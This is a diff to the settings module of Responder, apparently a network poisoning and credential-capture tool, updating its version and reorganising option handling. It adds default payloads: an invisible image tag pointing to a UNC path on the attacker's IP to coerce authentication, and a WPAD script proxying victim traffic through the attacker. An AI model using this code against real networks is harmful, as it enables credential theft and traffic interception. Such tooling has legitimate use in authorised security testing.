@@ -23,7 +23,7 @@ import subprocess
 
 from utils import *
 
-__version__ = 'Responder 3.0.7.0'
+__version__ = 'Responder 3.0.8.0'
 
 class Settings:
 	
@@ -114,6 +114,41 @@ class Settings:
 		self.AnalyzeLogFile      = os.path.join(self.LogDir, config.get('Responder Core', 'AnalyzeLog'))
 		self.ResponderConfigDump = os.path.join(self.LogDir, config.get('Responder Core', 'ResponderConfigDump'))
 
+		# CLI options
+		self.ExternalIP         = options.ExternalIP
+		self.LM_On_Off          = options.LM_On_Off
+		self.NOESS_On_Off       = options.NOESS_On_Off
+		self.WPAD_On_Off        = options.WPAD_On_Off
+		self.Wredirect          = options.Wredirect
+		self.DHCP_On_Off        = options.DHCP_On_Off
+		self.Basic              = options.Basic
+		self.Finger_On_Off      = options.Finger
+		self.Interface          = options.Interface
+		self.OURIP              = options.OURIP
+		self.Force_WPAD_Auth    = options.Force_WPAD_Auth
+		self.Upstream_Proxy     = options.Upstream_Proxy
+		self.AnalyzeMode        = options.Analyze
+		self.Verbose            = options.Verbose
+		self.ProxyAuth_On_Off   = options.ProxyAuth_On_Off
+		self.CommandLine        = str(sys.argv)
+
+		if self.ExternalIP:
+			self.ExternalIPAton = socket.inet_aton(self.ExternalIP)
+
+		self.Bind_To         = utils.FindLocalIP(self.Interface, self.OURIP)
+
+		if self.Interface == "ALL":
+                	self.Bind_To_ALL  = True
+		else:
+			self.Bind_To_ALL  = False
+
+		if self.Interface == "ALL":
+			self.IP_aton   = socket.inet_aton(self.OURIP)
+		else:
+			self.IP_aton   = socket.inet_aton(self.Bind_To)
+
+		self.Os_version      = sys.platform
+
 		self.FTPLog          = os.path.join(self.LogDir, 'FTP-Clear-Text-Password-%s.txt')
 		self.IMAPLog         = os.path.join(self.LogDir, 'IMAP-Clear-Text-Password-%s.txt')
 		self.POP3Log         = os.path.join(self.LogDir, 'POP3-Clear-Text-Password-%s.txt')
@@ -144,6 +179,12 @@ class Settings:
 		self.WPAD_Script      = config.get('HTTP Server', 'WPADScript')
 		self.HtmlToInject     = config.get('HTTP Server', 'HtmlToInject')
 
+		if len(self.HtmlToInject) == 0:
+			self.HtmlToInject = "<img src='file://///"+self.Bind_To+"/pictures/logo.jpg' alt='Loading' height='1' width='1'>"
+
+		if len(self.WPAD_Script) == 0:
+			self.WPAD_Script = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return "PROXY '+self.Bind_To+':3128; PROXY '+self.Bind_To+':3141; DIRECT";}'
+
 		if self.Serve_Exe == True:	
 			if not os.path.exists(self.Html_Filename):
 				print(utils.color("/!\ Warning: %s: file not found" % self.Html_Filename, 3, 1))
@@ -173,44 +214,6 @@ class Settings:
 		self.CaptureMultipleCredentials       = self.toBool(config.get('Responder Core', 'CaptureMultipleCredentials'))
 		self.CaptureMultipleHashFromSameHost  = self.toBool(config.get('Responder Core', 'CaptureMultipleHashFromSameHost'))
 		self.AutoIgnoreList                   = []
-
-		# CLI options
-		self.ExternalIP         = options.ExternalIP
-		self.LM_On_Off          = options.LM_On_Off
-		self.NOESS_On_Off       = options.NOESS_On_Off
-		self.WPAD_On_Off        = options.WPAD_On_Off
-		self.Wredirect          = options.Wredirect
-		self.DHCP_On_Off        = options.DHCP_On_Off
-		self.Basic              = options.Basic
-		self.Finger_On_Off      = options.Finger
-		self.Interface          = options.Interface
-		self.OURIP              = options.OURIP
-		self.Force_WPAD_Auth    = options.Force_WPAD_Auth
-		self.Upstream_Proxy     = options.Upstream_Proxy
-		self.AnalyzeMode        = options.Analyze
-		self.Verbose            = options.Verbose
-		self.ProxyAuth_On_Off   = options.ProxyAuth_On_Off
-		self.CommandLine        = str(sys.argv)
-
-		if self.ExternalIP:
-			self.ExternalIPAton = socket.inet_aton(self.ExternalIP)
-
-		if self.HtmlToInject == None:
-			self.HtmlToInject = ''
-
-		self.Bind_To         = utils.FindLocalIP(self.Interface, self.OURIP)
-
-		if self.Interface == "ALL":
-                	self.Bind_To_ALL  = True
-		else:
-			self.Bind_To_ALL  = False
-
-		if self.Interface == "ALL":
-			self.IP_aton   = socket.inet_aton(self.OURIP)
-		else:
-			self.IP_aton   = socket.inet_aton(self.Bind_To)
-
-		self.Os_version      = sys.platform
 
 		# Set up Challenge
 		self.NumChal = config.get('Responder Core', 'Challenge')
@@ -272,7 +275,7 @@ class Settings:
 				RoutingInfo = "Error fetching Routing information:", ex
 				pass
 
-		Message = "Current environment is:\nNetwork Config:\n%s\nDNS Settings:\n%s\nRouting info:\n%s\n\n"%(NetworkCard,DNS,RoutingInfo)
+		Message = "Current environment is:\nNetwork Config:\n%s\nDNS Settings:\n%s\nRouting info:\n%s\n\n"%(NetworkCard.decode('latin-1'),DNS.decode('latin-1'),RoutingInfo.decode('latin-1'))
 		try:
 			utils.DumpConfig(self.ResponderConfigDump, Message)
 			utils.DumpConfig(self.ResponderConfigDump,str(self))
